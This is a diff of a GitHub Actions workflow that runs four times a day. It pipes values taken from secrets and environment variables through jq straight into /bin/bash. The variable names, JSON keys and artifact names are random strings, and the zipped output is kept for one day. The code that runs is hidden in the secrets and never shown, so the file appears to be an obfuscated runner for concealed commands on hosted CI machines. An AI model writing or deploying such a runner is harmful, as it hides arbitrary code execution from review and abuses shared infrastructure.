@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '10 2,8,14,20 * * *'
+    - cron: '59 1,7,13,19 * * *'
 jobs:
   task:
     runs-on: ubuntu-latest
@@ -12,18 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          w09: ${{ secrets.w09 }}
+          b0: ${{ secrets.b0 }}
         run: |
-          printf '%s' "$w09" | jq -r .f42 | /bin/bash
-          printf '%s' "$stmc817" | jq -r .cunv604 | /bin/bash
-          printf '%s' "$faybi15552" | jq -r .k6 | /bin/bash
-          echo $vpveu706 | jq -r .fjjjc29 | /bin/bash
-          printf '%s' "$pg74" | jq -r .pcgix46 | /bin/bash
+          printf '%s' "$b0" | jq -r .va4 | /bin/bash
+          echo $pd954 | jq -r .goxmt2 | /bin/bash
+          echo $r665 | jq -r .nv70938 | /bin/bash
+          echo $yn5193 | jq -r .duj340 | /bin/bash
 
       - name: Upload artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: GblIsPcZ
+          name: 0oIEghE0
           path: "*.zip"
           retention-days: 1
